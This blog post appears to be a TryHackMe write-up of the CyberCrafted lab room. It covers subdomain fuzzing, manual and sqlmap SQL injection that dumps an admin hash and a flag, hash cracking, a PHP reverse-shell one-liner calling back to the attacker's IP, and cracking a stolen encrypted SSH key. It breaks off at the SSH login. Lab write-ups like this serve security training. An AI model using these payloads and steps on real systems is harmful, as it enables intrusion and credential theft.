---
layout: single
title: CyberCrafted - TryHackMe
excerpt: "In this post we will be solving the CyberCrafted room of the Tryhackme platform where we will be enumerating subdomains to find by fuzzing a path which will allow us to do a sql injection to get the hashes of a user and connect to the service through a login panel and then get a reverse shell after that we will use john to get passphrase of an id_rsa and thus migrate to another user for privilege escalation we will take advantage of a privilege we have at sudoers level"
date: 2023-07-15
classes: wide
toc: true
toc_label: "Contenido"
toc_icon: "fire"
header:
  teaser: /assets/images/try-writeup-cybercraft/icon.png
  teaser_home_page: true
  icon: /assets/images/tryhackme.webp
categories:
  - TryHackMe
tags:  
  - SQL Injection
  - Sudoers Privilege Escalation
  - Minecraft Server
  - Subdomain Enumeration
---

<p align="center">
<img src="/assets/images/try-writeup-cybercraft/banner.jpeg">
</p>

## PortScan

```bash
❯ catn targeted
# Nmap 7.93 scan initiated Thu Jul 13 20:10:57 2023 as: nmap -sCV -p22,80,25565 -oN targeted 10.10.50.16
Nmap scan report for 10.10.50.16
Host is up (0.20s latency).

PORT      STATE SERVICE   VERSION
22/tcp    open  ssh       OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 3736ceb9ac728ad7a6b78e45d0ce3c00 (RSA)
|   256 e9e7338a77282cd48c6d8a2ce7889530 (ECDSA)
|_  256 76a2b1cf1b3dce6c60f563243eef70d8 (ED25519)
80/tcp    open  http      Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Did not follow redirect to http://cybercrafted.thm/
|_http-server-header: Apache/2.4.29 (Ubuntu)
25565/tcp open  minecraft Minecraft 1.7.2 (Protocol: 127, Message: ck00r lcCyberCraftedr ck00rrck00r e-TryHackMe-r  ck00r, Users: 0/1)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Enumeration

We found a **subdomain** so add it to your `/etc/hosts`

```bash
❯ echo "10.10.93.170 cybercrafted.thm" | sudo tee -a /etc/hosts
```

These are the technologies that are running on the web service 

```ruby
❯ whatweb http://10.10.93.170
http://10.10.93.170 [302 Found] Apache[2.4.29], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.93.170], RedirectLocation[http://cybercrafted.thm/]
http://cybercrafted.thm/ [200 OK] Apache[2.4.29], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.93.170], Title[Cybercrafted], X-UA-Compatible[IE=edge]
```

We see a Minecraft hacker

![](/assets/images/try-writeup-cybercraft/hacker.png)

if we look at the source code we find information

![](/assets/images/try-writeup-cybercraft/zi.png)

Some programmers tend to make these mistakes of leaving them publicly available

Now we know the next step is to make `Fuzzing` to obtain the new `subdomains`

```bash
❯ gobuster vhost -u http://cybercrafted.thm -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 50 --no-error
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://cybercrafted.thm
[+] Method:       GET
[+] Threads:      50
[+] Wordlist:     /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2023/07/15 21:41:38 Starting gobuster in VHOST enumeration mode
===============================================================
Found: store.cybercrafted.thm (Status: 403) [Size: 287]
Found: www.admin.cybercrafted.thm (Status: 200) [Size: 937]
Found: www.store.cybercrafted.thm (Status: 403) [Size: 291]
Found: admin.cybercrafted.thm (Status: 200) [Size: 937]    
```

Add all of them to the `/etc/hosts`

```bash
❯ cat /etc/hosts | tail -n 1
10.10.93.170 cybercrafted.thm admin.cybercrafted.thm www.admin.cybercrafted.thm store.cybercrafted.thm
```

**store.cybercrafted.htm**

![](/assets/images/try-writeup-cybercraft/store.png)

**www.admin.cybercrafted.thm** 

![](/assets/images/try-writeup-cybercraft/web1.png)

Ok we can use **gobuster** to discover new routes

```bash
❯ gobuster dir -u http://store.cybercrafted.thm/ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -t 100 --no-error -x php -s 200
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://store.cybercrafted.thm/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2023/07/15 21:47:01 Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 287]
/search.php           (Status: 200) [Size: 838]
```

![](/assets/images/try-writeup-cybercraft/web2.png)

## SQL Injection Manual

If you type a `'` we see this 

![](/assets/images/try-writeup-cybercraft/web3.png)

Now we can know it's vulnerable to **SQL Injection**

4 columns `' oder by 4-- -`

![](/assets/images/try-writeup-cybercraft/web4.png)

We can see the name of the **database** `' union select 1,2,3,database()-- -`

![](/assets/images/try-writeup-cybercraft/web5.png)

Now we going to enumerate the tables of the database `' union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema='webapp'-- -`

![](/assets/images/try-writeup-cybercraft/web6.png)

Now we going to enumerate the columns of the table **admin** `' union select 1,2,3,group_concat(column_name) from information_schema.columns where table_schema='webapp' and table_name='admin'-- -`

![](/assets/images/try-writeup-cybercraft/web7.png)

Now finally let's look at the content of the columns `user:hash` `' union select 1,2,3,group_concat(user,0x3a,hash) from admin-- -`

![](/assets/images/try-writeup-cybercraft/final.png)

## SQL Injection with sqlmap

This is another option to make the **SQL Injection** we can use `sqlmap`

```bash
❯ sqlmap -u "http://store.cybercrafted.thm/search.php" --method POST --data "search=doesnt&submit=matter" -p search --batch --dump
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.6.12#stable}
|_ -| . [.]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 20:21:14 /2023-07-15/

[20:21:14] [INFO] testing connection to the target URL
[20:21:15] [INFO] checking if the target is protected by some kind of WAF/IPS
[20:21:15] [INFO] testing if the target URL content is stable
[20:21:15] [INFO] target URL content is stable
[20:21:15] [WARNING] heuristic (basic) test shows that POST parameter 'search' might not be injectable
[20:21:16] [INFO] testing for SQL injection on POST parameter 'search'
[20:21:16] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[20:21:19] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[20:21:19] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[20:21:21] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[20:21:22] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[20:21:24] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[20:21:25] [INFO] testing 'Generic inline queries'
[20:21:25] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[20:21:26] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[20:21:28] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[20:21:29] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[20:21:40] [INFO] POST parameter 'search' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[20:21:40] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[20:21:40] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[20:21:41] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[20:21:42] [INFO] target URL appears to have 4 columns in query
[20:21:43] [INFO] POST parameter 'search' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
POST parameter 'search' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 58 HTTP(s) requests:
---
Parameter: search (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: search=doesnt' AND (SELECT 3319 FROM (SELECT(SLEEP(5)))IDcE) AND 'wUnX'='wUnX&submit=matter

    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: search=doesnt' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b6a7a71,0x4e6c437776454b6d534569667761636f4d677879684b7375437972614771776166415a5767416642,0x7178717171)-- -&submit=matter
---
[20:21:43] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 18.04 (bionic)
web application technology: Apache 2.4.29
back-end DBMS: MySQL >= 5.0.12
[20:21:45] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[20:21:45] [INFO] fetching current database
[20:21:45] [INFO] fetching tables for database: 'webapp'
[20:21:45] [INFO] fetching columns for table 'stock' in database 'webapp'
[20:21:45] [INFO] fetching entries for table 'stock' in database 'webapp'
Database: webapp
Table: stock
[139 entries]
+-----+------+------------------------+--------+
| id  | cost | item                   | amount |
+-----+------+------------------------+--------+
| 4   | 0.5$ | Acacia Boat            | 1x     |
| 5   | 0.5$ | Armor Stand            | 1x     |
| 6   | 0.2$ | Beetroot Seeds         | 16x    |
| 7   | 0.5$ | Birch Boat             | 1x     |
| 8   | 1$   | Bottle of Enchanting   | 64x    |
| 9   | 0.5$ | Bow                    | 1x     |
| 10  | 0.2$ | Bucket                 | 1x     |
| 11  | 0.1$ | Carrot                 | 64x    |
| 12  | 0.4$ | Cocoa Beans            | 64     |
| 13  | 0.5$ | Crossbow               | 1x     |
| 14  | 0.5$ | Dark Oak Boat          | 1x     |
| 15  | 0.1$ | Egg                    | 16x    |
| 16  | 5$   | End Crystal            | 1x     |
| 17  | 1$   | Ender Pearl            | 16     |
| 18  | 2$   | Eye of Ender           | 16x    |
| 19  | 1$   | Fire Charge            | 16x    |
| 20  | 0.8$ | Firework Rocket        | 16x    |
| 21  | 0.2$ | Fishing Rod            | 1x     |
| 22  | 0.2$ | Flint and Steel        | 1x     |
| 23  | 0.2$ | Glow Berries           | 16x    |
| 24  | 0.1$ | Glow Item Frame        | 1x     |
| 25  | 0.1$ | Item Frame             | 1x     |
| 26  | 0.5$ | Jungle Boat            | 1x     |
| 27  | 0.1$ | Kelp                   | 64x    |
| 28  | 0.5$ | Lava Bucket            | 1x     |
| 29  | 0.6$ | Lead                   | 1x     |
| 30  | 2$   | Lingering Potion       | 16x    |
| 31  | 0.8$ | Melon Seeds            | 64x    |
| 32  | 0.8$ | Minecart               | 1x     |
| 33  | 1$   | Nether Wart            | 16x    |
| 34  | 0.5$ | Oak Boat               | 1x     |
| 35  | 0.2$ | Painting               | 1x     |
| 36  | 1$   | Potato                 | 64x    |
| 37  | 2$   | Redstone Dust          | 64x    |
| 38  | 0.4$ | Snowball               | 16x    |
| 39  | 0.1$ | Splash Potion          | 1x     |
| 40  | 0.5$ | Spruce Boat            | 1x     |
| 41  | 1$   | String                 | 64x    |
| 42  | 5$   | Trident                | 1x     |
| 43  | 0.5$ | Water Bucket           | 1x     |
| 44  | 0.5$ | Wheat Seeds            | 64x    |
| 45  | 2$   | Arrow                  | 64x    |
| 46  | 1$   | Bone                   | 64x    |
| 47  | 0.4$ | Bone Meal              | 64x    |
| 48  | 0.5$ | Bowl                   | 16x    |
| 49  | 2$   | Bread                  | 64x    |
| 50  | 1$   | Chainmail Boots        | 1x     |
| 51  | 1.5$ | Chainmail Chestplate   | 1x     |
| 52  | 1$   | Chainmail Helmet       | 1x     |
| 53  | 1.2$ | Chainmail Leggings     | 1x     |
| 54  | 0.5$ | Compass                | 1x     |
| 55  | 1$   | Cooked Chicken         | 64x    |
| 56  | 1$   | Cooked Cod             | 64x    |
| 57  | 1$   | Cooked Mutton          | 64x    |
| 58  | 1$   | Cooked Porkchop        | 64x    |
| 59  | 1$   | Cooked Rabbit          | 64x    |
| 60  | 1$   | Cooked Salmon          | 64x    |
| 61  | 2$   | Diamond Axe            | 1x     |
| 62  | 4$   | Diamond Boots          | 1x     |
| 63  | 6$   | Diamond Chestplate     | 1x     |
| 64  | 2$   | Diamond Helmet         | 1x     |
| 65  | 1$   | Diamond Hoe            | 1x     |
| 66  | 2$   | Diamond Horse Armor    | 1x     |
| 67  | 5$   | Diamond Leggings       | 1x     |
| 68  | 3$   | Diamond Pickaxe        | 1x     |
| 69  | 2$   | Diamond Shovel         | 1x     |
| 70  | 4$   | Diamond Sword          | 1x     |
| 71  | 8$   | Elytra                 | 1x     |
| 72  | 150$ | Enchanted Golden Apple | 64x    |
| 73  | 5$   | Golden Apple           | 64x    |
| 74  | 1$   | Golden Axe             | 1x     |
| 75  | 2$   | Golden Boots           | 1x     |
| 76  | 4$   | Golden Carrot          | 64x    |
| 77  | 2$   | Golden Chestplate      | 1x     |
| 78  | 1$   | Golden Helmet          | 1x     |
| 79  | 0.5$ | Golden Hoe             | 1x     |
| 80  | 0.5$ | Golden Horse Armor     | 1x     |
| 81  | 0.5$ | Golden Leggings        | 1x     |
| 82  | 0.5$ | Golden Pickaxe         | 1x     |
| 83  | 0.5$ | Golden Shovel          | 1x     |
| 84  | 0.5$ | Golden Sword           | 1x     |
| 85  | 1$   | Iron Axe               | 1x     |
| 86  | 1.5$ | Iron Boots             | 1x     |
| 87  | 3$   | Iron Chestplate        | 1x     |
| 88  | 1$   | Iron Helmet            | 1x     |
| 89  | 0.5$ | Iron Hoe               | 1x     |
| 90  | 2$   | Iron Horse Armor       | 1x     |
| 91  | 2$   | Iron Leggings          | 1x     |
| 92  | 1$   | Iron Pickaxe           | 1x     |
| 93  | 0.8$ | Iron Shovel            | 1x     |
| 94  | 1$   | Iron Sword             | 1x     |
| 95  | 5$   | Lapis Lazuli           | 64x    |
| 96  | 0.2$ | Milk Bucket            | 1x     |
| 97  | 1$   | Mushroom Stew          | 16x    |
| 98  | 4$   | Name Tag               | 16x    |
| 99  | 5$   | Netherite Axe          | 1x     |
| 100 | 6$   | Netherite Boots        | 1x     |
| 101 | 10$  | Netherite Chestplate   | 1x     |
| 102 | 4$   | Netherite Helmet       | 1x     |
| 103 | 6    | Netherite Hoe          | 1x     |
| 104 | 8$   | Netherite Leggings     | 1x     |
| 105 | 5$   | Netherite Pickaxe      | 1x     |
| 106 | 5$   | Netherite Shovel       | 1x     |
| 107 | 5$   | Netherite Sword        | 1x     |
| 108 | 1$   | Saddle                 | 1x     |
| 109 | 0.5$ | Shears                 | 1x     |
| 110 | 0.5$ | Shield                 | 1x     |
| 111 | 1$   | Sugar                  | 64x    |
| 112 | 4$   | Suspicious Stew        | 1x     |
| 113 | 4$   | Tipped Arrow           | 16x    |
| 114 | 5$   | Totem of Undying       | 1x     |
| 115 | 0.2$ | Tropical Fish          | 1x     |
| 116 | 4$   | Turtle Shell           | 16x    |
| 117 | 2$   | Wheat                  | 64x    |
| 118 | 2$   | Amethyst Shard         | 16x    |
| 119 | 5$   | Blaze Powder           | 64x    |
| 120 | 5$   | Blaze Rod              | 32x    |
| 121 | 1$   | Clock                  | 1x     |
| 122 | 3$   | Coal                   | 64x    |
| 123 | 5$   | Copper Ingot           | 64x    |
| 124 | 20$  | Diamond                | 64x    |
| 125 | 20$  | Emerald                | 64x    |
| 126 | 2$   | Flint                  | 64x    |
| 127 | 10$  | Ghast Tear             | 64x    |
| 128 | 5$   | Glowstone Dust         | 64x    |
| 129 | 5$   | Gunpowder              | 64x    |
| 130 | 4$   | Heart of the Sea       | 1x     |
| 131 | 10$  | Iron Ingot             | 64x    |
| 132 | 2$   | Lapis Lazuli           | 64x    |
| 133 | 2$   | Nautilus Shell         | 16x    |
| 134 | 1$   | Nether Brick           | 64x    |
| 135 | 8$   | Nether Quartz          | 64x    |
| 136 | 10$  | Nether Star            | 1x     |
| 137 | 500$ | Netherite Ingot        | 64x    |
| 138 | 50$  | Netherite Scrap        | 64x    |
| 139 | 5$   | Raw Gold               | 64x    |
| 140 | 5$   | Raw Iron               | 64x    |
| 141 | 2$   | Shulker Shell          | 16x    |
| 142 | 1$   | Slimeball              | 16x    |
+-----+------+------------------------+--------+

[20:21:46] [INFO] table 'webapp.stock' dumped to CSV file '/root/.local/share/sqlmap/output/store.cybercrafted.thm/dump/webapp/stock.csv'
[20:21:46] [INFO] fetching columns for table 'admin' in database 'webapp'
[20:21:46] [INFO] fetching entries for table 'admin' in database 'webapp'
[20:21:47] [INFO] recognized possible password hashes in column 'hash'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N
do you want to crack them via a dictionary-based attack? [Y/n/q] Y
[20:21:47] [INFO] using hash method 'sha1_generic_passwd'
what dictionary do you want to use?
[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
> 1
[20:21:47] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N] N
[20:21:47] [INFO] starting dictionary-based cracking (sha1_generic_passwd)
[20:21:47] [INFO] starting 2 processes 
[20:22:35] [WARNING] no clear password(s) found                                                                                
Database: webapp
Table: admin
[2 entries]
+----+------------------------------------------+---------------------+
| id | hash                                     | user                |
+----+------------------------------------------+---------------------+
| 1  | 88b949dd5cdfbecb9f2ecbbfa24e5974234e7c01 | xXUltimateCreeperXx |
| 4  | THM{bbe315906038c3a62d9b195001f75008}    | web_flag            |
+----+------------------------------------------+---------------------+

[20:22:35] [INFO] table 'webapp.admin' dumped to CSV file '/root/.local/share/sqlmap/output/store.cybercrafted.thm/dump/webapp/admin.csv'
[20:22:35] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 29 times
[20:22:35] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/store.cybercrafted.thm'
[20:22:35] [WARNING] your sqlmap version is outdated

[*] ending @ 20:22:35 /2023-07-15/
```

## Cracking Hashes 

Now we have to crack the hash we can use `john` or use the webpage <https://crackstation.net/> also we have the **web_flag** this's important to finished the room

```bash
❯ echo "88b949dd5cdfbecb9f2ecbbfa24e5974234e7c01" > hash
```

This is the **password**,  we have credentials

![](/assets/images/try-writeup-cybercraft/crack.png)

```bash
❯ john --show hashh
?:diamond123456789

1 password hash cracked, 0 left
```

## Shell as www-data

We can now access to the `panel.php` on the subdomain `admin.cybercracfted.htb` with the credentials  `xXUltimateCreeperXx:diamond123456789`

![](/assets/images/try-writeup-cybercraft/login.png)

We can run commands

![](/assets/images/try-writeup-cybercraft/comands.png)

If we made a test like `ping -c 1 myIP` we recive the `ping`

![](/assets/images/try-writeup-cybercraft/receive.png)

```bash
❯ tcpdump -i tun0 icmp -n
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
20:35:29.428700 IP 10.10.93.170 > 10.2.28.226: ICMP echo request, id 2080, seq 1, length 64
20:35:29.428727 IP 10.2.28.226 > 10.10.93.170: ICMP echo reply, id 2080, seq 1, length 64
```

Now use `netcat` and we will be listening on port 443 to get the reverse shell 

```bash
❯ nc -nlvp 443
Listening on 0.0.0.0 443
```

The **webpage** use **php** so we can send the reverse shell with a oneliner in `php` ![](/assets/images/try-writeup-cybercraft/send.png)

`php -r '$sock=fsockopen("10.2.28.226",443);exec("/bin/sh -i <&3 >&3 2>&3");'`

```bash
❯ nc -nlvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.93.170 40186
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ 
```

If you want to do a `ctrl+c` and don't lost the shell you can do this 

```bash
❯ nc -nlvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.93.170 40188
/bin/sh: 0: can't access tty; job control turned off
$ script /dev/null -c bash
Script started, file is /dev/null
www-data@cybercrafted:/var/www/admin$ ^Z
zsh: suspended  nc -nlvp 443
❯ stty raw -echo; fg
[1]  + continued  nc -nlvp 443
                              reset xterm
ENTER
www-data@cybercrafted:/var/www/admin$ export TERM=xterm
```

We found another 2 users more 

```bash
www-data@cybercrafted:/$ cat /etc/passwd | grep sh
root:x:0:0:root:/root:/bin/bash
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
xxultimatecreeperxx:x:1001:1001:,,,:/home/xxultimatecreeperxx:/bin/bash
cybercrafted:x:1002:1002:,,,:/home/cybercrafted:/bin/bash
www-data@cybercrafted:/$ 
```

If we try to reuse the passwords we have, they don't work

```bash
www-data@cybercrafted:/$ su xxultimatecreeperxx
Password: 
su: Authentication failure
www-data@cybercrafted:/$ ^C
www-data@cybercrafted:/$ su cybercrafted
Password: 
su: Authentication failure
www-data@cybercrafted:/$ 
```

## Shell as cybercrafted 

We found a **encrypted** `id_rsa` of the user `xxultimatecreeperxx`

```bash
www-data@cybercrafted:/home/xxultimatecreeperxx/.ssh$ ls -la
total 16
drwxrwxr-x 2 xxultimatecreeperxx xxultimatecreeperxx 4096 Jun 27  2021 .
drwxr-xr-x 5 xxultimatecreeperxx xxultimatecreeperxx 4096 Oct 15  2021 ..
-rw-r--r-- 1 xxultimatecreeperxx xxultimatecreeperxx  414 Jun 27  2021 authorized_keys
-rw-r--r-- 1 xxultimatecreeperxx xxultimatecreeperxx 1766 Jun 27  2021 id_rsa
www-data@cybercrafted:/home/xxultimatecreeperxx/.ssh$ cat id_rsa 
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,3579498908433674083EAAD00F2D89F6

Sc3FPbCv/4DIpQUOalsczNkVCR+hBdoiAEM8mtbF2RxgoiV7XF2PgEehwJUhhyDG
+Bb/uSiC1AsL+UO8WgDsbSsBwKLWijmYCmsp1fWp3xaGX2qVVbmI45ch8ef3QQ1U
SCc7TmWJgI/Bt6k9J60WNThmjKdYTuaLymOVJjiajho799BnAQWE89jOLwE3VA5m
SfcytNIJkHHQR67K2z2f0noCh2jVkM0sx8QS+hUBeNWT6lr3pEoBKPk5BkRgbpAu
lSkN+Ubrq2/+DA1e/LB9u9unwi+zUec1G5utqfmNPIHYyB2ZHWpX8Deyq5imWwH9
FkqfnN3JpXIW22TOMPYOOKAjan3XpilhOGhbZf5TUz0StZmQfozp5WOU/J5qBTtQ
sXG4ySXCWGEq5Mtj2wjdmOBIjbmVURWklbsN+R6UiYeBE5IViA9sQTPXcYnfDNPm
stB2ukMrnmINOu0U2rrHFqOwNKELmzSr7UmdxiHCWHNOSzH4jYl0zjWI7NZoTLNA
eE214PUmIhiCkNWgcymwhJ5pTq5tUg3OUeq6sSDbvU8hCE6jjq5+zYlqs+DkIW2v
VeaVnbA2hij69kGQi/ABtS9PrvRDj/oSIO4YMyZIhvnH+miCjNUNxVuH1k3LlD/6
LkvugR2wXG2RVdGNIwrhtkz8b5xaUvLY4An/rgJpn8gYDjIJj66uKQs5isdzHSlf
jOjh5qkRyKYFfPegK32iDfeD3F314L3KBaAlSktPKpQ+ooqUtTa+Mngh3CL8JpOO
Hi6qk24cpDUx68sSt7wIzdSwyYW4A/h0vxnZSsU6kFAqR28/6pjThHoQ0ijdKgpO
8wj/u29pyQypilQoWO52Kis4IzuMN6Od+R8L4RnCV3bBR4ppDAnW3ADP312FajR+
DQAHHtfpQJYH92ohpj3dF5mJTT+aL8MfAhSUF12Mnn9d9MEuGRKIwHWF4d1K69lr
0GpRSOxDrAafNnfZoykOPRjZsswK3YXwFu3xWQFl3mZ7N+6yDOSTpJgJuNfiJ0jh
MBMMh4+r7McEOhl4f4jd0PHPf3TdxaONzHtAoj69JYDIrxwJ28DtVuyk89pu2bY7
mpbcQFcsYHXv6Evh/evkSGsorcKHv1Uj3BCchL6V4mZmeJfnde6EkINNwRW8vDY+
gIYqA/r2QbKOdLyHD+xP4SpX7VVFliXXW9DDqdfLJ6glMNNNbM1mEzHBMywd1IKE
Zm+7ih+q4s0RBClsV0IQnzCrSij//4urAN5ZaEHf0k695fYAKMs41/bQ/Tv7kvNc
T93QJjphRwSKdyQIuuDsjCAoB7VuMI4hCrEauTavXU82lmo1cALeNSgvvhxxcd7r
1egiyyvHzUtOUP3RcOaxvHwYGQxGy1kq88oUaE7JrV2iSHBQTy6NkCV9j2RlsGZY
fYGHuf6juOc3Ub1iDV1B4Gk0964vclePoG+rdMXWK+HmdxfNHDiZyN4taQgBp656
RKTM49I7MsdD/uTK9CyHQGE9q2PekljkjdzCrwcW6xLhYILruayX1B4IWqr/p55k
v6+jjQHOy6a0Qm23OwrhKhO8kn1OdQMWqftf2D3hEuBKR/FXLIughjmyR1j9JFtJ
-----END RSA PRIVATE KEY-----
www-data@cybercrafted:/home/xxultimatecreeperxx/.ssh$ 
```

I'm going to copy the contents of the file and use `ssh2john` to obtain the `passphrase`

```bash
❯ nano id_rsa
❯ catn id_rsa
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,3579498908433674083EAAD00F2D89F6

Sc3FPbCv/4DIpQUOalsczNkVCR+hBdoiAEM8mtbF2RxgoiV7XF2PgEehwJUhhyDG
+Bb/uSiC1AsL+UO8WgDsbSsBwKLWijmYCmsp1fWp3xaGX2qVVbmI45ch8ef3QQ1U
SCc7TmWJgI/Bt6k9J60WNThmjKdYTuaLymOVJjiajho799BnAQWE89jOLwE3VA5m
SfcytNIJkHHQR67K2z2f0noCh2jVkM0sx8QS+hUBeNWT6lr3pEoBKPk5BkRgbpAu
lSkN+Ubrq2/+DA1e/LB9u9unwi+zUec1G5utqfmNPIHYyB2ZHWpX8Deyq5imWwH9
FkqfnN3JpXIW22TOMPYOOKAjan3XpilhOGhbZf5TUz0StZmQfozp5WOU/J5qBTtQ
sXG4ySXCWGEq5Mtj2wjdmOBIjbmVURWklbsN+R6UiYeBE5IViA9sQTPXcYnfDNPm
stB2ukMrnmINOu0U2rrHFqOwNKELmzSr7UmdxiHCWHNOSzH4jYl0zjWI7NZoTLNA
eE214PUmIhiCkNWgcymwhJ5pTq5tUg3OUeq6sSDbvU8hCE6jjq5+zYlqs+DkIW2v
VeaVnbA2hij69kGQi/ABtS9PrvRDj/oSIO4YMyZIhvnH+miCjNUNxVuH1k3LlD/6
LkvugR2wXG2RVdGNIwrhtkz8b5xaUvLY4An/rgJpn8gYDjIJj66uKQs5isdzHSlf
jOjh5qkRyKYFfPegK32iDfeD3F314L3KBaAlSktPKpQ+ooqUtTa+Mngh3CL8JpOO
Hi6qk24cpDUx68sSt7wIzdSwyYW4A/h0vxnZSsU6kFAqR28/6pjThHoQ0ijdKgpO
8wj/u29pyQypilQoWO52Kis4IzuMN6Od+R8L4RnCV3bBR4ppDAnW3ADP312FajR+
DQAHHtfpQJYH92ohpj3dF5mJTT+aL8MfAhSUF12Mnn9d9MEuGRKIwHWF4d1K69lr
0GpRSOxDrAafNnfZoykOPRjZsswK3YXwFu3xWQFl3mZ7N+6yDOSTpJgJuNfiJ0jh
MBMMh4+r7McEOhl4f4jd0PHPf3TdxaONzHtAoj69JYDIrxwJ28DtVuyk89pu2bY7
mpbcQFcsYHXv6Evh/evkSGsorcKHv1Uj3BCchL6V4mZmeJfnde6EkINNwRW8vDY+
gIYqA/r2QbKOdLyHD+xP4SpX7VVFliXXW9DDqdfLJ6glMNNNbM1mEzHBMywd1IKE
Zm+7ih+q4s0RBClsV0IQnzCrSij//4urAN5ZaEHf0k695fYAKMs41/bQ/Tv7kvNc
T93QJjphRwSKdyQIuuDsjCAoB7VuMI4hCrEauTavXU82lmo1cALeNSgvvhxxcd7r
1egiyyvHzUtOUP3RcOaxvHwYGQxGy1kq88oUaE7JrV2iSHBQTy6NkCV9j2RlsGZY
fYGHuf6juOc3Ub1iDV1B4Gk0964vclePoG+rdMXWK+HmdxfNHDiZyN4taQgBp656
RKTM49I7MsdD/uTK9CyHQGE9q2PekljkjdzCrwcW6xLhYILruayX1B4IWqr/p55k
v6+jjQHOy6a0Qm23OwrhKhO8kn1OdQMWqftf2D3hEuBKR/FXLIughjmyR1j9JFtJ
-----END RSA PRIVATE KEY-----
```

Now we have to obtain a **hash**

```bash
❯ python2 /usr/share/john/ssh2john.py id_rsa > hash
```

Finally we can see the `passphrase` **creepin2006**

```bash
❯ john -w:/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
creepin2006      (id_rsa)
1g 0:00:00:06 DONE (2023-07-15 20:56) 0.1529g/s 2192Kp/s 2192Kc/s 2192KC/sa6_123..*7¡Vamos!
Session completed
```

Now we give permission 600 to the id_rsa to be able to connect with SSH 

```bash
❯ ssh -i id_rsa xxultimatecreeperxx@10.10.93.170
The authenticity of host '10.10.93.170 (10.10.93.170)' can't be established.
ECDSA key fingerprint is SHA256:okt+zU5MJ0D6EUFqOILqeZ9l1c9p53AxM90JQpBvfvg.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.93.170' (ECDSA) to the list of known hosts.
Enter passphrase for key 'id_rsa': 
